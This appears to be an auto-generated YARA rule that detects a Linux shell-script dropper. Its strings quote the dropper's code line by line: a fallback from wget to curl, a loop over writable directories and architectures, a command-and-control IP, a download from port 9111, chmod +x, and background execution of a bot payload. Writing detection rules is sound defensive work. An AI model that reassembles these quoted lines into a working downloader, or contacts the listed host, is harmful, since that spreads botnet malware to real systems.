rule SCRIPT_Dropper_Unknown_ForgeAuto_517eeb10
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "517eeb100cda02042db8732b8de66e6ed4acd402489cd93fc798095ef9746e59"
        yarahub_uuid = "53b9416c-f02d-4413-8667-e5f5edcf55b9"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6cd9193bc01fbec20fe79c594f6fe254"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "if command -v wget >/dev/null; then" ascii
        $s1 = "elif command -v curl >/dev/null; then" ascii
        $s2 = "PATHS=\"/tmp /var/run /dev/shm /mnt /root /\"" ascii
        $s3 = "ARCHS=\"x86_64 i586 i486 i686 mipsel mips armv7l armv6l armv5l armv4l powerpc sh4 sparc m68k\"" ascii
        $s4 = "CNC_IP=\"217.60.195.19\"" ascii
        $s5 = "local b=\\$(head /dev/urandom | tr -dc a-z0-9 | head -c 6)" ascii
        $s6 = "for p in \\$PATHS; do" ascii
        $s7 = "cd \\$p || continue" ascii
        $s8 = "wget -q http://\\$CNC_IP:9111/\\$a -O \\$b" ascii
        $s9 = "curl -s http://\\$CNC_IP:9111/\\$a -o \\$b" ascii
        $s10 = "if [ -f \"\\$b\" ]; then" ascii
        $s11 = "chmod +x \"\\$b\"" ascii
        $s12 = "./\"\\$b\" bot.payload >/dev/null 2>&1 &" ascii
        $s13 = "for arch in \\$ARCHS; do" ascii
        $s14 = "/tmp /var/run /dev/shm /mnt /root /" ascii
        $s15 = "x86_64 i586 i486 i686 mipsel mips armv7l armv6l armv5l armv4l powerpc sh4 sparc m68k" ascii
        $s16 = "local a=\\$1" ascii
        $s17 = "# Try multiple downloaders" ascii
        $s18 = "x \"\\$arch\"" ascii
        $s19 = "217.60.195.19" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s2, $s3, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18) and 1 of ($s4, $s19)
}
